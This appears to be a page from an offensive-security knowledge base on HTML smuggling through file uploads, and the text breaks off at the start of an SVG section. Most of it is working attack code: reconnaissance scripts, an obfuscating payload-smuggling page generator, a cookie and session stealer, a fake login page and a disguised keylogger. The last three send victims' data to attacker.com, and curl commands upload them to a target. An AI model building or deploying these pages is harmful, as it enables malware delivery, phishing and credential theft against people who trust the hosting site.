---
title: HTML Smuggling Via Upload
description: HTML Smuggling Via Upload — Bypass Security Controls by Assembling Malicious Files Client-Side from Uploaded Content
navigation:
  icon: i-lucide-package-open
  title: HTML Smuggling Via Upload
---

## HTML Smuggling Via Upload

::badge
**High Severity — CWE-434 / CWE-79 / CWE-116 / CWE-451**
::

HTML smuggling in the context of file uploads is a two-headed attack. On one side, an attacker uploads an HTML file (or a file that renders as HTML) to a trusted domain, and that HTML file uses JavaScript to **programmatically construct and deliver a malicious binary payload** to victims who view it — bypassing email gateways, proxy filters, CDN WAFs, and endpoint detection tools. On the other side, the technique works in reverse: embedding encoded payloads inside uploaded files that **reconstruct themselves** when processed by the browser, evading content inspection that happens at upload time.

::tip
Traditional HTML smuggling uses email attachments or phishing links to deliver malware. **Upload-based HTML smuggling** is different — it leverages the trusted upload domain (`uploads.target.com`, `cdn.target.com`) to host the smuggling page, making it far more effective because the payload originates from a domain the victim already trusts, security tools whitelist, and CSP policies allow.
::

The core technique is deceptively simple: JavaScript running in the browser constructs a binary file from encoded data (Base64, Blob, ArrayBuffer), creates a download link, and either auto-triggers a download or presents a convincing UI to the user. No actual malicious file ever crosses the network in its assembled form — it's built entirely client-side from innocuous-looking data embedded in HTML.

---

## Understanding the Attack Surface

### Why Upload-Based Smuggling Works

::accordion
  :::accordion-item{icon="i-lucide-shield-off" label="Security Tools That Are Bypassed"}
  HTML smuggling defeats security controls because the malicious payload **never exists as a file on the network**. It's assembled from encoded text data by the browser's JavaScript engine.

  | Security Control | Why It Fails | Details |
  | ---------------- | ------------ | ------- |
  | **Email gateway scanning** | Scans attachments, not JS-generated blobs | HTML file itself contains no malware signatures |
  | **Web proxy inspection** | Inspects downloaded files at the proxy | File is created client-side, never passes through proxy |
  | **CDN/WAF scanning** | Scans uploaded content on the server | The uploaded HTML is "just HTML" — payload is encoded text |
  | **Antivirus (on upload)** | Scans uploaded file for malware | The HTML file has no malware — it's JavaScript code |
  | **Antivirus (on download)** | May detect at browser level | Smart EICAR/signature evasion possible with encoding |
  | **DLP (Data Loss Prevention)** | Monitors network file transfers | No file transfer occurs — file built in browser memory |
  | **Sandboxing** | Detonates files in sandbox | HTML may detect sandbox environment and not trigger |
  | **Content-Type filtering** | Blocks executable downloads | File is generated from `Blob()`, not fetched from server |
  | **CSP (Content Security Policy)** | If upload domain is same-origin | CSP allows scripts from 'self' — uploaded HTML executes |
  | **Network IDS/IPS** | Inspects network traffic patterns | Encoded payload looks like normal Base64 text data |
  :::

  :::accordion-item{icon="i-lucide-layers" label="Upload-Based vs Traditional HTML Smuggling"}
  | Aspect | Traditional (Email/Phishing) | Upload-Based |
  | ------ | ---------------------------- | ------------ |
  | **Delivery** | Email attachment or phishing link | Uploaded to trusted application |
  | **Domain trust** | Unknown/suspicious domain | Target's own domain (trusted) |
  | **SSL certificate** | Attacker's certificate | Target's valid certificate |
  | **CSP compliance** | May violate CSP | Same-origin — CSP allows it |
  | **User suspicion** | External link = suspicious | Internal upload = trusted |
  | **Security whitelist** | Not whitelisted | Domain likely whitelisted |
  | **Persistence** | Link can be taken down | Lives on target's infrastructure |
  | **Attribution** | Traces to attacker's hosting | Traces to target's own servers |
  | **Browser warnings** | May trigger download warnings | Fewer warnings from trusted domain |
  :::

  :::accordion-item{icon="i-lucide-target" label="Attack Scenarios"}
  | Scenario | Description | Impact |
  | -------- | ----------- | ------ |
  | **Malware delivery from trusted domain** | Upload HTML that auto-downloads `.exe`/`.dll` to visitors | Malware distribution via trusted domain |
  | **Phishing from trusted upload** | HTML phishing page hosted on `uploads.target.com` | Credential theft from trusted origin |
  | **Stored XSS via HTML upload** | HTML with JavaScript executes on same origin | Session hijacking, account takeover |
  | **CSP bypass payload delivery** | Trusted domain serves malicious scripts | Complete CSP defeat |
  | **Watering hole attack** | Shared file link distributes malware to team | Internal network compromise |
  | **Drive-by download** | User views "image" that triggers download | Endpoint compromise |
  | **Document weaponization** | HTML reassembles macro-enabled Office doc | Document-based malware delivery |
  | **Dropper stage** | HTML downloads and executes next-stage payload | Multi-stage attack chain |
  :::
::

---

## Reconnaissance — Finding Smuggling Vectors

### Identify HTML Upload & Rendering Points

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Detect HTML Upload Acceptance"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ HTML Upload Acceptance Test ═══"

  # Test uploading HTML content with various extensions and Content-Types
  HTML_CONTENT='<html><body><h1>HTML Upload Test</h1></body></html>'
  echo "$HTML_CONTENT" > /tmp/html_test.txt

  # Direct HTML extensions
  for ext in html htm xhtml mhtml shtml hta svg xml; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/html_test.txt;filename=test.${ext}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  echo ""

  # HTML as image (content sniffing scenario)
  for ext in jpg png gif bmp txt pdf csv; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/html_test.txt;filename=test.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] HTML as .${ext} (image/jpeg CT) ACCEPTED"
  done

  echo ""

  # SVG upload (SVG is XML that browsers render as HTML-like)
  echo '<svg xmlns="http://www.w3.org/2000/svg"><text>SVG Test</text></svg>' > /tmp/svg_test.svg
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/svg_test.svg;filename=test.svg;type=image/svg+xml" \
    -H "Cookie: $COOKIE" 2>/dev/null)
  [ "$STATUS" = "200" ] && echo "[+] SVG upload ACCEPTED"

  # Check how uploaded HTML is served
  echo ""
  echo "─── Serving Behavior Check ───"

  # Upload HTML and check response headers when accessing it
  curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/html_test.txt;filename=serve_test.html;type=text/html" \
    -H "Cookie: $COOKIE" > /dev/null

  for dir in uploads files media content static; do
      HEADERS=$(curl -sI "https://target.com/${dir}/serve_test.html" 2>/dev/null)
      STATUS=$(echo "$HEADERS" | head -1 | awk '{print $2}')
      if [ "$STATUS" = "200" ]; then
          CT=$(echo "$HEADERS" | grep -i "content-type" | tr -d '\r')
          NOSNIFF=$(echo "$HEADERS" | grep -i "x-content-type-options" | tr -d '\r')
          CD=$(echo "$HEADERS" | grep -i "content-disposition" | tr -d '\r')
          echo "[*] Found at: /${dir}/serve_test.html"
          echo "    CT: ${CT:-NOT SET}"
          echo "    nosniff: ${NOSNIFF:-MISSING}"
          echo "    Disposition: ${CD:-NOT SET (renders inline)}"

          if echo "$CT" | grep -qi "text/html"; then
              echo "    [!!!] Served as text/html → RENDERS AS WEB PAGE"
          fi
          if [ -z "$CD" ] || echo "$CD" | grep -qi "inline"; then
              echo "    [!] No Content-Disposition: attachment → browser renders it"
          fi
      fi
  done

  rm -f /tmp/html_test.txt /tmp/svg_test.svg
  ```
  :::

  :::tabs-item{icon="i-lucide-radar" label="Detect Content Sniffing for HTML"}
  ```bash
  # If direct HTML upload is blocked, HTML content in other file types
  # may be sniffed and rendered as HTML by the browser

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  TARGET="https://target.com"

  echo "═══ Content Sniffing → HTML Rendering Detection ═══"

  HTML_PAYLOAD='<html><body><h1>SNIFF_SMUGGLE_TEST</h1><script>document.title="SMUGGLED"</script></body></html>'

  # Upload HTML content with non-HTML extensions
  for ext in jpg txt csv xml json bin dat pdf doc; do
      echo "$HTML_PAYLOAD" > "/tmp/sniff_${ext}.${ext}"
      RESP=$(curl -s -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/sniff_${ext}.${ext};filename=sniff_test.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)

      if echo "$RESP" | grep -qiE "success|url|path"; then
          echo "[+] .${ext} accepted"

          # Check how it's served
          for dir in uploads files; do
              SERVED=$(curl -sI "${TARGET}/${dir}/sniff_test.${ext}" 2>/dev/null)
              SERVED_CT=$(echo "$SERVED" | grep -i "content-type" | head -1 | tr -d '\r')
              NOSNIFF=$(echo "$SERVED" | grep -i "x-content-type-options" | head -1 | tr -d '\r')

              if [ -n "$SERVED_CT" ]; then
                  echo "    Served as: ${SERVED_CT}"
                  [ -z "$NOSNIFF" ] && echo "    [!] nosniff MISSING — browser may sniff as HTML"
              fi
          done
      fi
  done

  rm -f /tmp/sniff_*
  ```
  :::

  :::tabs-item{icon="i-lucide-radar" label="CSP & Same-Origin Analysis"}
  ```bash
  TARGET="https://target.com"

  echo "═══ CSP & Same-Origin Analysis for Smuggling ═══"

  # Check CSP headers
  CSP=$(curl -sI "$TARGET" | grep -i "content-security-policy" | tr -d '\r')
  echo "[*] CSP: ${CSP:-NOT SET}"

  if [ -z "$CSP" ]; then
      echo "    [!!!] No CSP — uploaded HTML can run ANY JavaScript"
  fi

  if echo "$CSP" | grep -qi "script-src.*'self'"; then
      echo "    [!] script-src includes 'self'"
      echo "        If uploads are same-origin, JS in uploaded HTML executes"
  fi

  if echo "$CSP" | grep -qi "'unsafe-inline'"; then
      echo "    [!] 'unsafe-inline' present — inline scripts allowed"
  fi

  if echo "$CSP" | grep -qi "blob:"; then
      echo "    [!] blob: allowed — Blob URLs can deliver payloads"
  fi

  if echo "$CSP" | grep -qi "data:"; then
      echo "    [!] data: allowed — data URIs can deliver payloads"
  fi

  # Check if uploads are served from same origin
  echo ""
  echo "─── Upload Origin Analysis ───"

  MAIN_ORIGIN=$(echo "$TARGET" | grep -oP 'https?://[^/]+')
  echo "[*] Main origin: ${MAIN_ORIGIN}"

  # Upload a test file and check where it's served from
  echo "test" > /tmp/origin_test.txt
  RESP=$(curl -s -X POST "${TARGET}/api/upload" \
    -F "file=@/tmp/origin_test.txt;filename=origin_test.txt" \
    -H "Cookie: session=TOKEN" 2>/dev/null)

  UPLOAD_URL_FOUND=$(echo "$RESP" | grep -oP 'https?://[^"]+' | head -1)
  UPLOAD_ORIGIN=$(echo "$UPLOAD_URL_FOUND" | grep -oP 'https?://[^/]+')

  echo "[*] Upload served from: ${UPLOAD_ORIGIN:-unknown}"

  if [ "$MAIN_ORIGIN" = "$UPLOAD_ORIGIN" ]; then
      echo "    [!!!] SAME ORIGIN — uploaded HTML has full access to main app!"
      echo "         Cookies, localStorage, DOM of main app all accessible"
  elif [ -n "$UPLOAD_ORIGIN" ]; then
      echo "    [*] Different origin: ${UPLOAD_ORIGIN}"
      echo "        Cross-origin restrictions apply (safer)"
  fi

  rm -f /tmp/origin_test.txt
  ```
  :::
::

---

## Payload Crafting

### HTML Smuggling Payloads — Binary Delivery

::tabs
  :::tabs-item{icon="i-lucide-package" label="Base64 Blob Download"}
  ```bash
  # ═══════════════════════════════════════════════
  # HTML that assembles and delivers a binary file from Base64
  # The binary never crosses the network — built entirely in browser
  # ═══════════════════════════════════════════════

  # Generate the HTML smuggling page
  cat > smuggle_b64.html << 'HTMLEOF'
  <!DOCTYPE html>
  <html>
  <head>
  <title>Document Preview — Loading...</title>
  <style>
  body{font-family:-apple-system,system-ui,sans-serif;display:flex;
       justify-content:center;align-items:center;min-height:100vh;
       background:#f8f9fa;margin:0}
  .card{background:white;padding:40px;border-radius:12px;
        box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center;max-width:450px}
  .icon{font-size:48px;margin-bottom:16px}
  h2{color:#1a1a2e;margin:0 0 8px}
  p{color:#666;margin:0 0 24px;line-height:1.6}
  .progress{width:100%;height:6px;background:#e9ecef;border-radius:3px;overflow:hidden;margin:16px 0}
  .progress-bar{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0;
                border-radius:3px;transition:width 2s ease}
  .btn{display:inline-block;padding:12px 32px;background:#667eea;color:white;
       border-radius:8px;text-decoration:none;font-weight:600;cursor:pointer;border:none;font-size:15px}
  .btn:hover{background:#5a67d8}
  .status{color:#999;font-size:13px;margin-top:12px}
  </style>
  </head>
  <body>
  <div class="card">
  <div class="icon">📄</div>
  <h2>Preparing Document</h2>
  <p>Your document is being prepared for download. Please wait...</p>
  <div class="progress"><div class="progress-bar" id="pbar"></div></div>
  <p class="status" id="status">Initializing...</p>
  </div>

  <script>
  (function() {
      // ── Configuration ──
      // Replace this Base64 with your actual payload
      // Example: EICAR test string for AV testing
      var b64Payload = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNU\nLUZJTEUhJEgrSCo=";

      var fileName = "quarterly_report.pdf";
      var mimeType = "application/pdf";

      // ── Smuggling Logic ──
      var statusEl = document.getElementById('status');
      var pbar = document.getElementById('pbar');

      // Animate progress
      setTimeout(function() { pbar.style.width = '30%'; statusEl.textContent = 'Decoding document...'; }, 500);
      setTimeout(function() { pbar.style.width = '60%'; statusEl.textContent = 'Assembling file...'; }, 1200);
      setTimeout(function() { pbar.style.width = '90%'; statusEl.textContent = 'Preparing download...'; }, 1800);

      setTimeout(function() {
          pbar.style.width = '100%';
          statusEl.textContent = 'Download ready!';

          // Decode Base64 to binary
          var raw = atob(b64Payload.replace(/\s/g, ''));
          var bytes = new Uint8Array(raw.length);
          for (var i = 0; i < raw.length; i++) {
              bytes[i] = raw.charCodeAt(i);
          }

          // Create Blob and trigger download
          var blob = new Blob([bytes], { type: mimeType });
          var url = URL.createObjectURL(blob);
          var a = document.createElement('a');
          a.href = url;
          a.download = fileName;

          // Auto-trigger download
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);

          // Cleanup
          setTimeout(function() { URL.revokeObjectURL(url); }, 1000);

          // Update UI
          var card = document.querySelector('.card');
          card.innerHTML = '<div class="icon">✅</div><h2>Download Complete</h2>' +
              '<p>If the download did not start automatically, ' +
              '<a href="' + url + '" download="' + fileName + '" class="btn">Click Here</a></p>';
      }, 2500);
  })();
  </script>
  </body>
  </html>
  HTMLEOF

  echo "[+] Created smuggle_b64.html"
  echo "[*] Replace b64Payload with your actual payload encoded in Base64"
  echo "[*] To encode a file: base64 -w0 payload.exe"
  ```
  :::

  :::tabs-item{icon="i-lucide-package" label="Chunked ArrayBuffer Assembly"}
  ```bash
  # ═══════════════════════════════════════════════
  # Advanced: Payload split into multiple ArrayBuffer chunks
  # Assembled at runtime — harder for static analysis to detect
  # ═══════════════════════════════════════════════

  cat > smuggle_chunks.html << 'HTMLEOF'
  <!DOCTYPE html>
  <html>
  <head>
  <title>Report Viewer</title>
  <style>
  body{font-family:Arial,sans-serif;display:flex;justify-content:center;
       align-items:center;min-height:100vh;background:#f0f2f5;margin:0}
  .container{background:white;padding:48px;border-radius:16px;
             box-shadow:0 8px 32px rgba(0,0,0,.1);text-align:center;width:400px}
  .spinner{border:4px solid #e9ecef;border-top:4px solid #667eea;
           border-radius:50%;width:40px;height:40px;margin:0 auto 20px;
           animation:spin 1s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  h2{margin:0 0 12px;color:#333}
  p{color:#666;margin:0 0 20px}
  </style>
  </head>
  <body>
  <div class="container" id="main">
  <div class="spinner"></div>
  <h2>Loading Report</h2>
  <p>Please wait while the document is prepared...</p>
  </div>

  <script>
  // Payload encoded as hex strings split across multiple "data chunks"
  // Each chunk looks like innocent application data
  // Static analysis sees strings, not binary content

  var dataChunks = [
      // Split your hex-encoded payload across these chunks
      // Example: "Hello World" in hex, split into parts
      "48656c6c",
      "6f20576f",
      "726c6421",
  ];

  function hexToBytes(hex) {
      var bytes = new Uint8Array(hex.length / 2);
      for (var i = 0; i < hex.length; i += 2) {
          bytes[i/2] = parseInt(hex.substr(i, 2), 16);
      }
      return bytes;
  }

  function assemblePayload() {
      // Reassemble from chunks
      var fullHex = dataChunks.join('');
      var bytes = hexToBytes(fullHex);

      // Create blob and download
      var blob = new Blob([bytes], { type: 'application/octet-stream' });
      var url = URL.createObjectURL(blob);

      var a = document.createElement('a');
      a.href = url;
      a.download = 'report_Q4_2024.xlsx';
      document.body.appendChild(a);
      a.click();

      // Update UI
      document.getElementById('main').innerHTML =
          '<h2 style="color:#28a745">✓ Download Complete</h2>' +
          '<p>Your report has been downloaded.</p>';

      setTimeout(function() { URL.revokeObjectURL(url); }, 5000);
  }

  // Delay to make it look like a loading process
  setTimeout(assemblePayload, 3000);
  </script>
  </body>
  </html>
  HTMLEOF

  echo "[+] Created smuggle_chunks.html"
  echo "[*] To encode a file as hex chunks:"
  echo '    xxd -p payload.exe | fold -w 1000 | sed '\''s/^/    "/; s/$/",/'\'''
  ```
  :::

  :::tabs-item{icon="i-lucide-package" label="Obfuscated Payload Assembly"}
  ```python [generate_smuggle_page.py]
  #!/usr/bin/env python3
  """
  Generate an HTML smuggling page from any binary payload.
  
  The payload is encoded, split, obfuscated, and embedded in
  innocent-looking JavaScript that reassembles it at runtime.
  """
  import base64
  import os
  import sys
  import random
  import string

  def generate_smuggle_html(payload_path, output_html, download_name=None,
                             mime_type='application/octet-stream'):
      """Create HTML smuggling page from a binary payload file"""

      with open(payload_path, 'rb') as f:
          payload_data = f.read()

      if download_name is None:
          download_name = os.path.basename(payload_path)

      # Encode payload as Base64
      b64_encoded = base64.b64encode(payload_data).decode()

      # Split into random-sized chunks (evades pattern matching)
      chunks = []
      pos = 0
      while pos < len(b64_encoded):
          chunk_size = random.randint(50, 200)
          chunks.append(b64_encoded[pos:pos+chunk_size])
          pos += chunk_size

      # Generate random variable names (evades signature detection)
      def rand_name(length=8):
          return '_' + ''.join(random.choices(string.ascii_lowercase, k=length))

      var_chunks = rand_name()
      var_assembled = rand_name()
      var_bytes = rand_name()
      var_blob = rand_name()
      var_url = rand_name()
      var_link = rand_name()
      func_decode = rand_name()
      func_build = rand_name()

      # Build JavaScript array of chunks
      js_chunks = ',\n        '.join(f'"{chunk}"' for chunk in chunks)

      html = f'''<!DOCTYPE html>
  <html>
  <head>
  <title>Document Portal — Secure Access</title>
  <style>
  body{{font-family:-apple-system,system-ui,'Segoe UI',sans-serif;
       margin:0;min-height:100vh;display:flex;align-items:center;
       justify-content:center;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%)}}
  .card{{background:white;border-radius:16px;padding:48px;width:420px;
         text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}}
  .lock{{font-size:56px;margin-bottom:16px}}
  h1{{color:#1a1a2e;margin:0 0 8px;font-size:22px}}
  p{{color:#666;margin:0 0 28px;font-size:14px;line-height:1.6}}
  .bar-container{{background:#e9ecef;border-radius:8px;height:8px;
                   overflow:hidden;margin:20px 0}}
  .bar{{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);
       width:0;transition:width 1.5s ease}}
  .note{{color:#999;font-size:12px;margin-top:16px}}
  </style>
  </head>
  <body>
  <div class="card">
  <div class="lock">🔐</div>
  <h1>Secure Document Access</h1>
  <p>Your document is being decrypted and prepared for secure download.</p>
  <div class="bar-container"><div class="bar" id="pb"></div></div>
  <p class="note" id="st">Authenticating access...</p>
  </div>
  <script>
  // Document preparation module
  (function(){{
      var {var_chunks} = [
          {js_chunks}
      ];

      var pb = document.getElementById('pb');
      var st = document.getElementById('st');

      function {func_decode}(b) {{
          var r = atob(b);
          var a = new Uint8Array(r.length);
          for (var i = 0; i < r.length; i++) a[i] = r.charCodeAt(i);
          return a;
      }}

      function {func_build}() {{
          st.textContent = 'Assembling document...';
          pb.style.width = '60%';

          setTimeout(function() {{
              var {var_assembled} = {var_chunks}.join('');
              var {var_bytes} = {func_decode}({var_assembled});
              var {var_blob} = new Blob([{var_bytes}], {{ type: '{mime_type}' }});
              var {var_url} = URL.createObjectURL({var_blob});
              var {var_link} = document.createElement('a');
              {var_link}.href = {var_url};
              {var_link}.download = '{download_name}';

              pb.style.width = '100%';
              st.textContent = 'Download starting...';

              document.body.appendChild({var_link});
              {var_link}.click();
              document.body.removeChild({var_link});

              setTimeout(function() {{ URL.revokeObjectURL({var_url}); }}, 5000);

              document.querySelector('.card').innerHTML =
                  '<div class="lock">✅</div><h1>Download Complete</h1>' +
                  '<p>If the download did not start, <a href="' + {var_url} +
                  '" download="{download_name}">click here</a>.</p>';
          }}, 1500);
      }}

      setTimeout(function() {{
          pb.style.width = '30%';
          st.textContent = 'Decrypting content...';
          setTimeout({func_build}, 1500);
      }}, 1000);
  }})();
  </script>
  </body>
  </html>'''

      with open(output_html, 'w') as f:
          f.write(html)

      print(f"[+] Generated: {output_html}")
      print(f"    Payload: {payload_path} ({len(payload_data):,} bytes)")
      print(f"    Chunks: {len(chunks)}")
      print(f"    Download name: {download_name}")
      print(f"    MIME type: {mime_type}")
      print(f"    HTML size: {os.path.getsize(output_html):,} bytes")

  if __name__ == "__main__":
      if len(sys.argv) < 2:
          # Create a demo with EICAR test string
          eicar = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
          with open('/tmp/eicar_test.txt', 'wb') as f:
              f.write(eicar)
          generate_smuggle_html('/tmp/eicar_test.txt', 'smuggle_eicar.html',
                                 'security_scan_report.pdf', 'application/pdf')
          os.remove('/tmp/eicar_test.txt')
      else:
          generate_smuggle_html(sys.argv[1],
                                 sys.argv[2] if len(sys.argv) > 2 else 'smuggle.html',
                                 sys.argv[3] if len(sys.argv) > 3 else None)
  ```
  :::
::

### HTML Smuggling for XSS & Data Theft

::tabs
  :::tabs-item{icon="i-lucide-code" label="Cookie Theft via Uploaded HTML"}
  ```bash
  # ═══════════════════════════════════════════════
  # Upload HTML that steals cookies and session data
  # when a victim views the uploaded "document"
  # ═══════════════════════════════════════════════

  cat > smuggle_xss.html << 'HTMLEOF'
  <!DOCTYPE html>
  <html>
  <head><title>Shared Document</title>
  <style>
  body{font-family:Arial,sans-serif;display:flex;justify-content:center;
       align-items:center;min-height:100vh;background:#f5f5f5;margin:0}
  .card{background:white;padding:40px;border-radius:12px;
        box-shadow:0 2px 15px rgba(0,0,0,.1);max-width:500px}
  h1{color:#333;font-size:24px}
  p{color:#666;line-height:1.6}
  </style>
  </head>
  <body>
  <div class="card">
  <h1>📋 Shared Document</h1>
  <p>This document has been shared with you. Content is loading...</p>
  </div>

  <script>
  // Execute on the trusted upload domain
  (function() {
      var data = {
          cookie: document.cookie,
          localStorage: JSON.stringify(localStorage),
          sessionStorage: JSON.stringify(sessionStorage),
          url: location.href,
          origin: location.origin,
          domain: document.domain,
          referrer: document.referrer,
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          screenRes: screen.width + 'x' + screen.height,
      };

      // Try to access parent window (if same origin)
      try {
          if (window.opener) {
              data.openerCookie = window.opener.document.cookie;
              data.openerUrl = window.opener.location.href;
          }
      } catch(e) {}

      // Try to access parent frame (if embedded)
      try {
          if (window.parent !== window) {
              data.parentCookie = window.parent.document.cookie;
              data.parentUrl = window.parent.location.href;
          }
      } catch(e) {}

      // Exfiltrate
      // Method 1: fetch
      fetch('https://attacker.com/collect', {
          method: 'POST',
          body: JSON.stringify(data),
          headers: {'Content-Type': 'application/json'},
          mode: 'no-cors'
      }).catch(function(){});

      // Method 2: Image beacon (backup)
      new Image().src = 'https://attacker.com/beacon?d=' +
          encodeURIComponent(btoa(JSON.stringify(data)));

      // Method 3: DNS exfil (most covert)
      var encoded = btoa(document.cookie || 'empty').replace(/[+/=]/g, '').substring(0, 60);
      new Image().src = 'https://' + encoded + '.attacker.com/x.gif';
  })();
  </script>
  </body>
  </html>
  HTMLEOF

  # Upload
  curl -X POST "https://target.com/api/upload" \
    -F "file=@smuggle_xss.html;filename=shared_document.html;type=text/html" \
    -H "Cookie: session=TOKEN"

  echo "[+] Upload the HTML file"
  echo "[*] When a victim opens the link, their cookies/session data are exfiltrated"
  echo "[*] Share link: https://target.com/uploads/shared_document.html"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Phishing Page on Trusted Domain"}
  ```bash
  # ═══════════════════════════════════════════════
  # Upload convincing phishing page hosted on trusted domain
  # Victims see target.com in the URL bar → high trust
  # ═══════════════════════════════════════════════

  cat > smuggle_phish.html << 'HTMLEOF'
  <!DOCTYPE html>
  <html>
  <head>
  <title>Session Expired — Re-authenticate</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
       background:#f0f2f5;display:flex;justify-content:center;align-items:center;
       min-height:100vh}
  .login-card{background:white;width:400px;padding:40px;border-radius:8px;
              box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1)}
  .logo{text-align:center;margin-bottom:24px}
  .logo img{width:180px;height:auto}
  .logo h1{font-size:24px;color:#1877f2;margin-top:8px}
  h2{font-size:17px;color:#1c1e21;text-align:center;margin-bottom:6px}
  .subtitle{color:#606770;font-size:15px;text-align:center;margin-bottom:20px}
  .alert{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:12px;
         margin-bottom:20px;font-size:14px;color:#856404}
  input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;
        font-size:15px;margin-bottom:12px;outline:none}
  input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
  .btn{width:100%;padding:14px;background:#1877f2;color:white;border:none;
       border-radius:6px;font-size:17px;font-weight:600;cursor:pointer}
  .btn:hover{background:#166fe5}
  .footer{text-align:center;margin-top:16px;font-size:13px;color:#90949c}
  .footer a{color:#1877f2;text-decoration:none}
  </style>
  </head>
  <body>
  <div class="login-card">
  <div class="logo"><h1>🔒 Secure Portal</h1></div>
  <h2>Session Expired</h2>
  <p class="subtitle">For your security, please re-enter your credentials</p>
  <div class="alert">⚠️ Your session timed out due to inactivity. Please sign in again.</div>
  <form id="loginForm">
  <input type="email" name="email" placeholder="Email or Username" required autofocus>
  <input type="password" name="password" placeholder="Password" required>
  <button type="submit" class="btn">Log In</button>
  </form>
  <p class="footer">Secured with SSL encryption · <a href="#">Privacy Policy</a></p>
  </div>

  <script>
  document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      var email = this.elements.email.value;
      var password = this.elements.password.value;

      // Send credentials to attacker
      fetch('https://attacker.com/phish', {
          method: 'POST',
          body: JSON.stringify({
              email: email,
              password: password,
              url: location.href,
              origin: location.origin,
              timestamp: new Date().toISOString()
          }),
          headers: {'Content-Type': 'application/json'},
          mode: 'no-cors'
      });

      // Also via beacon (backup)
      navigator.sendBeacon('https://attacker.com/phish-beacon',
          JSON.stringify({email: email, password: password}));

      // Show success message and redirect to real login
      this.innerHTML = '<p style="color:#28a745;text-align:center;padding:20px">' +
          '✓ Verified. Redirecting to your dashboard...</p>';

      setTimeout(function() {
          // Redirect to real login page
          window.location = location.origin + '/login';
      }, 2000);
  });
  </script>
  </body>
  </html>
  HTMLEOF

  curl -X POST "https://target.com/api/upload" \
    -F "file=@smuggle_phish.html;filename=account_verification.html;type=text/html" \
    -H "Cookie: session=TOKEN"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Keylogger Page"}
  ```bash
  cat > smuggle_keylog.html << 'HTMLEOF'
  <!DOCTYPE html>
  <html>
  <head><title>Meeting Notes — Shared</title>
  <style>
  body{font-family:Georgia,serif;max-width:800px;margin:0 auto;padding:40px;
       background:white;color:#333;line-height:1.8}
  h1{color:#1a1a2e;border-bottom:2px solid #e0e0e0;padding-bottom:12px}
  p{margin-bottom:16px}
  .note{background:#fff8e1;border-left:4px solid #ffc107;padding:16px;margin:20px 0}
  </style>
  </head>
  <body>
  <h1>📝 Q4 Strategy Meeting Notes</h1>
  <p class="note"><strong>Confidential:</strong> These notes are for internal distribution only.</p>

  <h2>Agenda Items</h2>
  <p>1. Revenue targets for Q4 2024</p>
  <p>2. Product roadmap updates</p>
  <p>3. Security audit results — <em>pending review</em></p>

  <h2>Action Items</h2>
  <p>Please review the attached action items and respond by end of week.</p>

  <p style="color:#999;font-size:14px;margin-top:40px">
  This document was shared via the company portal. If you received this in error,
  please disregard.
  </p>

  <script>
  // Silent keylogger — captures everything typed anywhere on the page
  (function() {
      var buf = '';
      var lastSend = Date.now();

      document.addEventListener('keypress', function(e) {
          buf += e.key;
          // Send every 15 characters or every 10 seconds
          if (buf.length >= 15 || Date.now() - lastSend > 10000) {
              navigator.sendBeacon('https://attacker.com/keys',
                  JSON.stringify({
                      keys: buf,
                      url: location.href,
                      time: new Date().toISOString()
                  }));
              buf = '';
              lastSend = Date.now();
          }
      });

      // Capture paste events
      document.addEventListener('paste', function(e) {
          var text = (e.clipboardData || window.clipboardData).getData('text');
          navigator.sendBeacon('https://attacker.com/paste',
              JSON.stringify({
                  pasted: text,
                  url: location.href,
                  time: new Date().toISOString()
              }));
      });

      // Capture any form submissions on the page
      document.addEventListener('submit', function(e) {
          var data = {};
          var form = e.target;
          new FormData(form).forEach(function(v, k) { data[k] = v; });
          navigator.sendBeacon('https://attacker.com/form',
              JSON.stringify({form: data, action: form.action, url: location.href}));
      }, true);
  })();
  </script>
  </body>
  </html>
  HTMLEOF

  curl -X POST "https://target.com/api/upload" \
    -F "file=@smuggle_keylog.html;filename=meeting_notes_q4.html;type=text/html" \
    -H "Cookie: session=TOKEN"
  ```
  :::
::

### SVG-Based HTML Smuggling

SVG files are images that support full JavaScript execution. They bypass many content filters because they are "just images."

::code-group
```bash [SVG Smuggling — File Download]
# SVG that triggers a file download when viewed as image

cat > smuggle.svg << 'SVGEOF'
<?xml version="1.0" encoding="UTF-8"?>
